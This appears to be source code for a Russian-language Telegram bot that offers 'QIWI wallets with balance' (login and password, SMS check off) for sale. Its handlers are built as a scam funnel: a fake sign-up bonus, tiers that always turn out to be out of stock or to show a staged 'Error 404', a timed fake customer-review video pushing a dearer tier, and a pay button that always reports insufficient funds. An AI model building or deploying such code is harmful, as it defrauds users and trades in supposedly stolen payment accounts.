from aiogram import types
from misc import dp, bot
from .sqlit import channeg_status,cheak_money,channeg_money,progrev
import asyncio

progrev1 = 20
otziv1 = 'BAACAgIAAxkBAAEBTZ9gwN-oV9z5RQE33IadEDYocRueFAAC7Q0AAm2FAUoSVns58u1wMR8E' #Видео отзыв


@dp.callback_query_handler(text_startswith='check')  # Нажал кнопку Я ПОДПИСАЛСЯ. ДЕЛАЕМ ПРОВЕРКУ
async def check(call: types.callback_query):
    await bot.send_message(call.message.chat.id, '⏳ Ожидайте. Идёт проверка подписки.')
    proverka1 = (await bot.get_chat_member(chat_id='@QiwiWalet_info', user_id=call.message.chat.id)).status
    if proverka1 == 'administrator' or proverka1 == 'member' or proverka1 == 'creator':
        await bot.send_message(call.message.chat.id, 'Доступ открыт. Напиши мне /start что бы продолжить работу и получить <b>2000 Pуб</b>',parse_mode='html')
        channeg_status(call.message.chat.id)
        mon = cheak_money(call.message.chat.id)
        if int(mon) <2000:
            channeg_money(call.message.chat.id,2000)
    else:
        await bot.send_message(call.message.chat.id, 'Доступ закрыт. Повторите попытку')


@dp.callback_query_handler(text='profile')  # Нажал кнопку Профиль
async def profile(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='💰 Кошельки', callback_data='walled')
    bat_b = types.InlineKeyboardButton(text='💎 Пополнить баланс', callback_data='pay_money')
    bat_c = types.InlineKeyboardButton(text='👥 Профиль', callback_data='profile')
    bat_d = types.InlineKeyboardButton(text='ℹ Информация', callback_data='info')
    markup.add(bat_a, bat_b)
    markup.row(bat_c, bat_d)
    money = cheak_money(call.message.chat.id)
    if 'Профиль' in call.message.text:
        pass
    else:
        await bot.edit_message_text(message_id=call.message.message_id,chat_id=call.message.chat.id, text='🧾 Профиль\n\n'
                                                                                                      f'🆔Ваш id- {call.message.chat.id}\n'
                                                                                                      f'💰Ваш баланс - {money} рублей'
                                                                                                      f'',reply_markup=markup)

@dp.callback_query_handler(text='walled')  # Нажал кнопку Кошельки
async def walled(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='🥇 QIWI с балансом 7531 руб | 3890 руб', callback_data='qiwi_4')
    bat_b = types.InlineKeyboardButton(text='🥈 QIWI с балансом 4764 руб | 2597 руб', callback_data='qiwi_3')
    bat_c = types.InlineKeyboardButton(text='🥉 QIWI с балансом 3608 руб | 2293 руб', callback_data='qiwi_2')
    bat_d = types.InlineKeyboardButton(text='⭐ QIWI с балансом 2993 руб | 2094 руб', callback_data='qiwi_1')
    bat_e = types.InlineKeyboardButton(text='НАЗАД', callback_data='walled_exit')
    markup.add(bat_a)
    markup.add(bat_b)
    markup.add(bat_c)
    markup.add(bat_d)
    markup.add(bat_e)
    await bot.edit_message_text(message_id=call.message.message_id,chat_id=call.message.chat.id,text='<b>❕ Выберите нужный товар:</b>',reply_markup=markup,parse_mode='html')

@dp.callback_query_handler(text='walled_exit')
async def walled_exit(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='💰 Кошельки', callback_data='walled')
    bat_b = types.InlineKeyboardButton(text='💎 Пополнить баланс', callback_data='pay_money')
    bat_c = types.InlineKeyboardButton(text='👥 Профиль', callback_data='profile')
    bat_d = types.InlineKeyboardButton(text='ℹ Информация', callback_data='info')
    markup.add(bat_a, bat_b)
    markup.row(bat_c, bat_d)
    await bot.edit_message_text(message_id=call.message.message_id,chat_id=call.message.chat.id,text= '😎 Добро пожаловать в нашего бота', reply_markup=markup)





@dp.callback_query_handler(text_startswith='qiwi') # Нажал на какой либо кошелек
async def qiwi_walled(call: types.callback_query):
    qiwi_number = int(call.data[5:])
    money = cheak_money(call.message.chat.id)


    if int(money) < 2094:
        if qiwi_number == 1: #Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a,bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥇 QIWI с балансом 2993 руб | 2094 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2094 ₽.\n'
                                             '💰 Баланс кошелька: 2993 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 899 рублей\n'
                                             '💠 Кол-во товара: 3',reply_markup=markup,parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥈 QIWI с балансом 3608 руб | 2293 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2293₽.\n'
                                             '💰 Баланс кошелька: 3608 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 1315 рублей\n'
                                             '💠 Кол-во товара: 16', reply_markup=markup, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥈 QIWI с балансом 4764 руб | 2597 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2597₽.\n'
                                             '💰 Баланс кошелька: 4764 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 2167 рублей\n'
                                             '💠 Кол-во товара: 19', reply_markup=markup, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>⭐ QIWI с балансом 7531 руб | 3890 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 3890₽.\n'
                                             '💰 Баланс кошелька: 7531 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 3641 рублей\n'
                                             '💠 Кол-во товара: 7', reply_markup=markup, parse_mode='html')


    elif int(money) >= 2094 and int(money) < 2293 :
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url='https://t.me/QWSupport')
        markup1.add(bat_b)
        markup1.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥇 QIWI с балансом 2993 руб | 2094 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2094 ₽.\n'
                                             '💰 Баланс кошелька: 2993 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 899 рублей\n'
                                             '💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥈 QIWI с балансом 3608 руб | 2293 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2293₽.\n'
                                             '💰 Баланс кошелька: 3608 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 1315 рублей\n'
                                             '💠 Кол-во товара: 14', reply_markup=markup, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥈 QIWI с балансом 4764 руб | 2597 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2597₽.\n'
                                             '💰 Баланс кошелька: 4764 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 2167 рублей\n'
                                             '💠 Кол-во товара: 17', reply_markup=markup, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>⭐ QIWI с балансом 7531 руб | 3890 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 3890₽.\n'
                                             '💰 Баланс кошелька: 7531 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 3641 рублей\n'
                                             '💠 Кол-во товара: 6', reply_markup=markup, parse_mode='html')
        await asyncio.sleep(progrev1)
        if int(cheak_money(call.message.chat.id)) >= 2094 and int(cheak_money(call.message.chat.id)) < 2293:
            if progrev(call.message.chat.id) == 1 :
                await bot.send_video(chat_id=call.message.chat.id,video=otziv1,caption="""⚠️Внимание
У нас закончились кошельки по 2094₽. Вы можете выбрать другой тип кошелька💰

Приносим свои извинения , выше вы можете посмотреть отзыв клиента который купил кошелек <b>с балансом : 3608₽</b>""",parse_mode='html')





    elif int(money) >= 2293 and int(money) < 2597:
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        markup1.add(bat_b)

        markup2 = types.InlineKeyboardMarkup()
        bat_b2 = types.InlineKeyboardButton(text='🔚 ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url = 'https://t.me/QWSupport')
        markup2.add(bat_b2)
        markup2.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥇 QIWI с балансом 2993 руб | 2094 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2094 ₽.\n'
                                             '💰 Баланс кошелька: 2993 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 899 рублей\n'
                                             '💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Данный кошелек убран из ассортимента\n'
                                             'Вы можете связаться с поддержкой и <b>вывести средства с бота</b> или выбрать другой тип кошелька', reply_markup=markup2, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥈 QIWI с балансом 4764 руб | 2597 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2597₽.\n'
                                             '💰 Баланс кошелька: 4764 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 2167 рублей\n'
                                             '💠 Кол-во товара: 15', reply_markup=markup, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>⭐ QIWI с балансом 7531 руб | 3890 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 3890₽.\n'
                                             '💰 Баланс кошелька: 7531 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 3641 рублей\n'
                                             '💠 Кол-во товара: 5', reply_markup=markup, parse_mode='html')


    elif int(money) >= 2597 and int(money) < 3890:
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        markup1.add(bat_b)

        markup2 = types.InlineKeyboardMarkup()
        bat_b2 = types.InlineKeyboardButton(text='🔚 ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url = 'https://t.me/QWSupport')
        markup2.add(bat_b2)
        markup2.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥇 QIWI с балансом 2993 руб | 2094 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2094 ₽.\n'
                                             '💰 Баланс кошелька: 2993 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 899 рублей\n'
                                             '💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Данный кошелек убран из ассортимента\n'
                                             'Вы можете связаться с поддержкой и вывести средства с бота или выбрать другой тип кошелька', reply_markup=markup2, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Ошибка 404. Свяжитесь с поддержкой что-бы они выдали киви кошелек вручную ', reply_markup=markup2, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>⭐ QIWI с балансом 7531 руб | 3890 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 3890₽.\n'
                                             '💰 Баланс кошелька: 7531 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 3641 рублей\n'
                                             '💠 Кол-во товара: 5', reply_markup=markup, parse_mode='html')
    elif int(money) >= 3890:
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        markup1.add(bat_b)

        markup2 = types.InlineKeyboardMarkup()
        bat_b2 = types.InlineKeyboardButton(text='🔚 ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url = 'https://t.me/QWSupport')
        markup2.add(bat_b2)
        markup2.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>🥇 QIWI с балансом 2993 руб | 2094 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 2094 ₽.\n'
                                             '💰 Баланс кошелька: 2993 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 899 рублей\n'
                                             '💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Данный кошелек убран из ассортимента\n'
                                             'Вы можете связаться с поддержкой и вывести средства с бота или выбрать другой тип кошелька', reply_markup=markup2, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Ошибка 404. Свяжитесь с поддержкой что-бы они выдали киви кошелек вручную ', reply_markup=markup2, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             '<b>⭐ QIWI с балансом 7531 руб | 3890 руб</b>\n\n'
                                             '🔸 Qiwi кошелёк, цена: 3890₽.\n'
                                             '💰 Баланс кошелька: 7531 руб\n\n'
                                             '▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             '☑️Смс код выключен!\n\n'
                                             '💠 Прибыль: 3641 рублей\n'
                                             '💠 Кол-во товара: 3', reply_markup=markup, parse_mode='html')


@dp.callback_query_handler(text='exit_qiwi') # Нажал выйти после покупки
async def exit_qiwi(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='🥇 QIWI с балансом 7531 руб | 3890 руб', callback_data='qiwi_4')
    bat_b = types.InlineKeyboardButton(text='🥈 QIWI с балансом 4764 руб | 2597 руб', callback_data='qiwi_3')
    bat_c = types.InlineKeyboardButton(text='🥉 QIWI с балансом 3608 руб | 2293 руб', callback_data='qiwi_2')
    bat_d = types.InlineKeyboardButton(text='⭐ QIWI с балансом 2993 руб | 2094 руб', callback_data='qiwi_1')
    bat_e = types.InlineKeyboardButton(text='НАЗАД', callback_data='walled_exit')
    markup.add(bat_a)
    markup.add(bat_b)
    markup.add(bat_c)
    markup.add(bat_d)
    markup.add(bat_e)
    await bot.edit_message_text(message_id=call.message.message_id, chat_id=call.message.chat.id,
                                text='<b>❕ Выберите нужный товар:</b>', reply_markup=markup, parse_mode='html')


@dp.callback_query_handler(text_startswith='buy_qiwi') # Нажал Заплатить
async def bue_qiwi(call: types.callback_query):
    number = int(call.data[9:])
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='ЗАПЛАТИТЬ', callback_data='ready')
    bat_b = types.InlineKeyboardButton(text='ОТМЕНА', callback_data='otmena')
    markup.add(bat_a,bat_b)
    if number == 4:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         '🥇 QIWI с балансом 7531 руб | 3890 руб:\n\n'
                                         '💠 Цена: 3890 рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)
    elif number == 3:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         '🥈 QIWI с балансом 4764 руб | 2597 руб:\n\n'
                                         '💠 Цена: 2597 рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)

    elif number == 2:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         '🥈 QIWI с балансом 3608 руб | 2293 руб:\n\n'
                                         '💠 Цена: 2293 рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)
    else:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         '⭐ QIWI с балансом 2993 руб | 2094 руб\n\n'
                                         '💠 Цена: 2094 рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)

@dp.callback_query_handler(text='ready')
async def ready(call: types.callback_query):
    money = cheak_money(call.message.chat.id)
    a = await bot.send_message(call.message.chat.id, '❌ Недостаточно средств\n'
                                                     f'<b>⭐ На вашем счете: {money} рублей</b>\n\n',parse_mode='html')
    await asyncio.sleep(20)
    await bot.delete_message(chat_id=call.message.chat.id,message_id=a.message_id)


@dp.callback_query_handler(text='otmena')
async def otmena(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='🥇 QIWI с балансом 7531 руб | 3890 руб', callback_data='qiwi_4')
    bat_b = types.InlineKeyboardButton(text='🥈 QIWI с балансом 4764 руб | 2597 руб', callback_data='qiwi_3')
    bat_c = types.InlineKeyboardButton(text='🥉 QIWI с балансом 3608 руб | 2293 руб', callback_data='qiwi_2')
    bat_d = types.InlineKeyboardButton(text='⭐ QIWI с балансом 2993 руб | 2094 руб', callback_data='qiwi_1')
    bat_e = types.InlineKeyboardButton(text='НАЗАД', callback_data='walled_exit')
    markup.add(bat_a)
    markup.add(bat_b)
    markup.add(bat_c)
    markup.add(bat_d)
    markup.add(bat_e)
    await bot.edit_message_text(message_id=call.message.message_id, chat_id=call.message.chat.id,
                                text='<b>❕ Выберите нужный товар:</b>', reply_markup=markup, parse_mode='html')